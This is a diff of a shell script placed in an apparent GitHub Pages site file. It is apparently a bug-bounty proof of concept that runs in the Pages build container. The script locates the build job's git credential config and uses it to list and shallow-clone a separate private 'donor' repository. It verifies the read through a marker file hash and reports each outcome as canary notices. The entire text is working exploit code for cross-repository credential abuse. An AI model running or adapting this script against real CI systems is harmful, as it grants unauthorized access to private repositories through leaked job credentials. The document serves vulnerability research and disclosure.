@@ -3,31 +3,30 @@ permalink: /bbp-bin/tr
 ---
 #!/bin/sh
 
-if [ ! -e /tmp/pages-bbp-container-once-r5-9c24 ]; then
-  : > /tmp/pages-bbp-container-once-r5-9c24
-  printf '%s\n' '::notice::PAGES_CONTAINER_EXEC_CANARY_20260918_R5_9C24' >&2
+if /bin/mkdir /tmp/pages-bbp-container-lock-r6-a731 2>/dev/null; then
+  printf '%s\n' '::notice::PAGES_CONTAINER_EXEC_CANARY_20260918_R6_A731' >&2
 
   if [ ! -e /github/workspace/_site/bbp-control ] && [ ! -L /github/workspace/_site/bbp-control ]; then
-    printf '%s\n' '::notice::PAGES_UNUSED_SYMLINK_CONTROL_REMOVED_20260918_R5_9C24' >&2
+    printf '%s\n' '::notice::PAGES_UNUSED_SYMLINK_CONTROL_REMOVED_20260918_R6_A731' >&2
   fi
 
-  if [ "${GITHUB_RUN_NUMBER:-}" = '5' ] && [ "${GITHUB_RUN_ATTEMPT:-}" = '1' ]; then
+  if [ "${GITHUB_RUN_NUMBER:-}" = '6' ] && [ "${GITHUB_RUN_ATTEMPT:-}" = '1' ]; then
     if GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_TERMINAL_PROMPT=0 \
       /usr/bin/git ls-remote --exit-code \
       https://github.com/aidan02h12/pages-sass-symlink-bbp-20260917.git \
       HEAD >/dev/null 2>&1; then
-      printf '%s\n' '::notice::PAGES_PUBLIC_CONTROL_OK_20260918_R5_9C24' >&2
+      printf '%s\n' '::notice::PAGES_PUBLIC_CONTROL_OK_20260918_R6_A731' >&2
     else
-      printf '%s\n' '::notice::PAGES_PUBLIC_CONTROL_FAILED_20260918_R5_9C24' >&2
+      printf '%s\n' '::notice::PAGES_PUBLIC_CONTROL_FAILED_20260918_R6_A731' >&2
     fi
 
     if GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_TERMINAL_PROMPT=0 \
       /usr/bin/git ls-remote --exit-code \
       https://github.com/aidan02h12/pages-artifact-donor-bbp-20260917.git \
       HEAD >/dev/null 2>&1; then
-      printf '%s\n' '::warning::PAGES_ANON_PRIVATE_UNEXPECTEDLY_ACCEPTED_20260918_R5_9C24' >&2
+      printf '%s\n' '::warning::PAGES_ANON_PRIVATE_UNEXPECTEDLY_ACCEPTED_20260918_R6_A731' >&2
     else
-      printf '%s\n' '::notice::PAGES_ANON_PRIVATE_REJECTED_20260918_R5_9C24' >&2
+      printf '%s\n' '::notice::PAGES_ANON_PRIVATE_REJECTED_20260918_R6_A731' >&2
     fi
 
     credential_config=''
@@ -39,30 +38,38 @@ if [ ! -e /tmp/pages-bbp-container-once-r5-9c24 ]; then
     done
 
     if [ -z "$credential_config" ]; then
-      printf '%s\n' '::notice::PAGES_JOB_CREDENTIAL_CONFIG_MISSING_20260918_R5_9C24' >&2
+      printf '%s\n' '::notice::PAGES_JOB_CREDENTIAL_CONFIG_MISSING_20260918_R6_A731' >&2
     else
-      printf '%s\n' '::notice::PAGES_JOB_CREDENTIAL_CONFIG_PRESENT_20260918_R5_9C24' >&2
-      donor_dir='/tmp/pages-bbp-private-donor-r5-9c24'
+      printf '%s\n' '::notice::PAGES_JOB_CREDENTIAL_CONFIG_PRESENT_20260918_R6_A731' >&2
       if GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_TERMINAL_PROMPT=0 \
-        /usr/bin/git -c include.path="$credential_config" clone --quiet --depth=1 \
-        --no-checkout \
+        /usr/bin/git -c include.path="$credential_config" ls-remote --exit-code \
         https://github.com/aidan02h12/pages-artifact-donor-bbp-20260917.git \
-        "$donor_dir" >/dev/null 2>&1; then
-        observed_blob=$(/usr/bin/git --git-dir="$donor_dir/.git" \
-          rev-parse HEAD:SECURITY-RESEARCH-FIXTURE.md 2>/dev/null)
-        if [ "$observed_blob" = 'df34486a63da185478e25b2972163612eb2856b6' ]; then
-          printf '%s\n' '::warning::PAGES_CROSS_REPO_MARKER_READ_ACCEPTED_20260918_R5_9C24' >&2
+        HEAD >/dev/null 2>&1; then
+        printf '%s\n' '::warning::PAGES_CROSS_REPO_REF_READ_ACCEPTED_20260918_R6_A731' >&2
+        donor_dir='/tmp/pages-bbp-private-donor-r6-a731'
+        if GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_TERMINAL_PROMPT=0 \
+          /usr/bin/git -c include.path="$credential_config" clone --quiet --depth=1 \
+          --no-checkout \
+          https://github.com/aidan02h12/pages-artifact-donor-bbp-20260917.git \
+          "$donor_dir" >/dev/null 2>&1; then
+          observed_blob=$(/usr/bin/git --git-dir="$donor_dir/.git" \
+            rev-parse HEAD:SECURITY-RESEARCH-FIXTURE.md 2>/dev/null)
+          if [ "$observed_blob" = 'df34486a63da185478e25b2972163612eb2856b6' ]; then
+            printf '%s\n' '::warning::PAGES_CROSS_REPO_MARKER_READ_ACCEPTED_20260918_R6_A731' >&2
+          else
+            printf '%s\n' '::warning::PAGES_CROSS_REPO_CLONE_ACCEPTED_MARKER_MISMATCH_20260918_R6_A731' >&2
+          fi
+          observed_blob=''
         else
-          printf '%s\n' '::warning::PAGES_CROSS_REPO_CLONE_ACCEPTED_MARKER_MISMATCH_20260918_R5_9C24' >&2
+          printf '%s\n' '::warning::PAGES_CROSS_REPO_REF_ACCEPTED_CLONE_FAILED_20260918_R6_A731' >&2
         fi
-        observed_blob=''
       else
-        printf '%s\n' '::notice::PAGES_CROSS_REPO_MARKER_READ_REJECTED_20260918_R5_9C24' >&2
+        printf '%s\n' '::notice::PAGES_CROSS_REPO_REF_READ_REJECTED_20260918_R6_A731' >&2
       fi
       credential_config=''
     fi
   else
-    printf '%s\n' '::notice::PAGES_ONE_SHOT_GUARD_MISS_20260918_R5_9C24' >&2
+    printf '%s\n' '::notice::PAGES_ONE_SHOT_GUARD_MISS_20260918_R6_A731' >&2
   fi
 fi
 
